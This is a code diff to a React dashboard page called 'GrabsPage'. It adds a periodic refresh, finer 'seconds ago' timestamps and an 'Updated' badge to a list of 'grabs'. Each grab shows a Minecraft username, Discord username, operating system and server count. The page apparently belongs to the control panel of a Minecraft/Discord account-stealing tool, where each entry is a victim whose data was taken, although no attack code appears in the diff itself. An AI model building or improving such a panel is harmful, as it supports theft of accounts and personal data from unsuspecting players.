@@ -31,6 +31,12 @@ export default function GrabsPage() {
   const [loading, setLoading] = useState(true);
   const [search, setSearch] = useState('');
   const [userEmail, setUserEmail] = useState('');
+  const [, setTick] = useState(0);
+
+  useEffect(() => {
+    const interval = setInterval(() => setTick(t => t + 1), 10000);
+    return () => clearInterval(interval);
+  }, []);
 
   useEffect(() => {
     fetch('/api/auth/user')
@@ -50,12 +56,14 @@ export default function GrabsPage() {
       .catch(() => setLoading(false));
   }, []);
 
-  const formatTime = (t) => {
-    if (!t) return '';
-    const d = new Date(t);
+  const formatTime = (created, updated) => {
+    const ref = updated || created;
+    if (!ref) return '';
+    const d = new Date(ref);
     const now = new Date();
     const diff = Math.floor((now - d) / 1000);
-    if (diff < 60) return 'Just now';
+    if (diff < 5) return 'Just now';
+    if (diff < 60) return `${diff}s ago`;
     if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
     if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
     if (diff < 604800) return `${Math.floor(diff / 86400)}d ago`;
@@ -105,37 +113,43 @@ export default function GrabsPage() {
           />
         </div>
         <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
-          {filtered.map((g) => (
-            <div
-              key={g.id}
-              onClick={() => router.push(`/dashboard/grabs/${g.id}`)}
-              style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 12, padding: '16px 20px', display: 'flex', alignItems: 'center', gap: 14, cursor: 'pointer', transition: 'all 0.15s ease' }}
-              onMouseEnter={e => { e.currentTarget.style.borderColor = '#333'; e.currentTarget.style.background = '#15161e'; }}
-              onMouseLeave={e => { e.currentTarget.style.borderColor = colors.border; e.currentTarget.style.background = colors.panel; }}
-            >
-              <div style={{ width: 42, height: 42, borderRadius: 10, background: '#1a1b24', display: 'flex', alignItems: 'center', justifyContent: 'center', overflow: 'hidden' }}>
-                <img src={`https://mc-heads.net/avatar/${g.minecraft_username}/42`} alt="" style={{ width: 42, height: 42 }} onError={e => { e.target.style.display = 'none'; }} />
-              </div>
-              <div style={{ flex: 1, minWidth: 0 }}>
-                <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
-                  <span style={{ fontSize: 14, fontWeight: 600, color: colors.text }}>{g.minecraft_username}</span>
-                  <span style={{ background: '#1a2a2a', color: '#5eead4', fontSize: 10, padding: '2px 7px', borderRadius: 4, fontWeight: 600, whiteSpace: 'nowrap' }}>
-                    {g.os?.includes('Windows') ? 'Windows' : g.os?.includes('Mac') ? 'macOS' : g.os?.includes('Linux') ? 'Linux' : g.os || 'Unknown'}
-                  </span>
+          {filtered.map((g) => {
+            const isUpdated = g.updated_at && g.updated_at !== g.created_at;
+            return (
+              <div
+                key={g.id}
+                onClick={() => router.push(`/dashboard/grabs/${g.id}`)}
+                style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 12, padding: '16px 20px', display: 'flex', alignItems: 'center', gap: 14, cursor: 'pointer', transition: 'all 0.15s ease' }}
+                onMouseEnter={e => { e.currentTarget.style.borderColor = '#333'; e.currentTarget.style.background = '#15161e'; }}
+                onMouseLeave={e => { e.currentTarget.style.borderColor = colors.border; e.currentTarget.style.background = colors.panel; }}
+              >
+                <div style={{ width: 42, height: 42, borderRadius: 10, background: '#1a1b24', display: 'flex', alignItems: 'center', justifyContent: 'center', overflow: 'hidden' }}>
+                  <img src={`https://mc-heads.net/avatar/${g.minecraft_username}/42`} alt="" style={{ width: 42, height: 42 }} onError={e => { e.target.style.display = 'none'; }} />
                 </div>
-                <div style={{ fontSize: 12, color: colors.textDim, marginTop: 2, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{g.discord_username}</div>
+                <div style={{ flex: 1, minWidth: 0 }}>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
+                    <span style={{ fontSize: 14, fontWeight: 600, color: colors.text }}>{g.minecraft_username}</span>
+                    {isUpdated && (
+                      <span style={{ background: '#2a1a0a', color: '#f59e0b', fontSize: 9, padding: '2px 6px', borderRadius: 4, fontWeight: 700, textTransform: 'uppercase', letterSpacing: 0.5 }}>*Updated</span>
+                    )}
+                    <span style={{ background: '#1a2a2a', color: '#5eead4', fontSize: 10, padding: '2px 7px', borderRadius: 4, fontWeight: 600, whiteSpace: 'nowrap' }}>
+                      {g.os?.includes('Windows') ? 'Windows' : g.os?.includes('Mac') ? 'macOS' : g.os?.includes('Linux') ? 'Linux' : g.os || 'Unknown'}
+                    </span>
+                  </div>
+                  <div style={{ fontSize: 12, color: colors.textDim, marginTop: 2, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{g.discord_username}</div>
+                </div>
+                <div style={{ display: 'flex', alignItems: 'center', gap: 14, flexShrink: 0 }}>
+                  {g.servers && (
+                    <span style={{ fontSize: 12, color: colors.textDim, display: 'flex', alignItems: 'center', gap: 4 }}>
+                      🌐 {g.servers.split(',').filter(Boolean).length}
+                    </span>
+                  )}
+                  <span style={{ fontSize: 12, color: isUpdated ? '#f59e0b' : colors.textDim, whiteSpace: 'nowrap', fontWeight: isUpdated ? 600 : 400 }}>{formatTime(g.created_at, g.updated_at)}</span>
+                  <span style={{ color: '#444', fontSize: 14 }}>›</span>
+                </div>
               </div>
-              <div style={{ display: 'flex', alignItems: 'center', gap: 14, flexShrink: 0 }}>
-                {g.servers && (
-                  <span style={{ fontSize: 12, color: colors.textDim, display: 'flex', alignItems: 'center', gap: 4 }}>
-                    🌐 {g.servers.split(',').filter(Boolean).length}
-                  </span>
-                )}
-                <span style={{ fontSize: 12, color: colors.textDim, whiteSpace: 'nowrap' }}>{formatTime(g.created_at)}</span>
-                <span style={{ color: '#444', fontSize: 14 }}>›</span>
-              </div>
-            </div>
-          ))}
+            );
+          })}
           {filtered.length === 0 && !loading && (
             <div style={{ textAlign: 'center', color: colors.textDim, fontSize: 13, padding: 60 }}>
               <div style={{ fontSize: 28, marginBottom: 8 }}>📭</div>
